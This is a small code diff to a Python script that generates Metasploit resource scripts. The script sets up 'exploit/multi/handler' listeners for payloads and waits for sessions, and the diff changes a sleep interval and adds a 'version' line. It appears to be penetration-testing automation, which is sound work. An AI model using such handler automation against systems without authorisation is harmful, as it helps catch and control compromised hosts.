@@ -233,7 +233,7 @@ def makeRcScript(cmdList, targetData, sessionData, logFile):
     rcScriptContent = rcScriptContent + "echo '    while framework.sessions.count == 0 do '>> " + rcScriptName + '\n'
     rcScriptContent = rcScriptContent + "echo '        sleep(1)' >> " + rcScriptName + '\n'
     rcScriptContent = rcScriptContent + "echo '    end' >> " + rcScriptName + '\n'
-    rcScriptContent = rcScriptContent + "echo '    sleep(2)' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo '    sleep(5)' >> " + rcScriptName + '\n'
     rcScriptContent = rcScriptContent + "echo '</ruby>' >> " + rcScriptName + '\n'
     for i in cmdList:
         rcScriptContent = rcScriptContent + rubySleep
@@ -247,6 +247,7 @@ def OLDmakeExploitMsfHostRcScript(cmdList, msfHostData, targetData, payloadData,
     rubySleep = rubySleep + "echo '    sleep(2)' >> " + rcScriptName + '\n'
     rubySleep = rubySleep + "echo '</ruby>' >> " + rcScriptName + '\n'
     rcScriptContent = "# HANDLER SCRIPT FOR " + payloadData['VENOM_CMD'] +" \n"
+    rcScriptContent = rcScriptContent + "echo 'version ' > " + rcScriptName + "\n"
     rcScriptContent = rcScriptContent + "echo 'use exploit/multi/handler ' > " + rcScriptName + "\n"
     rcScriptContent = rcScriptContent + rubySleep
     rcScriptContent = rcScriptContent + "echo 'set payload " + payloadData['NAME'] +"' >> " + rcScriptName + '\n'
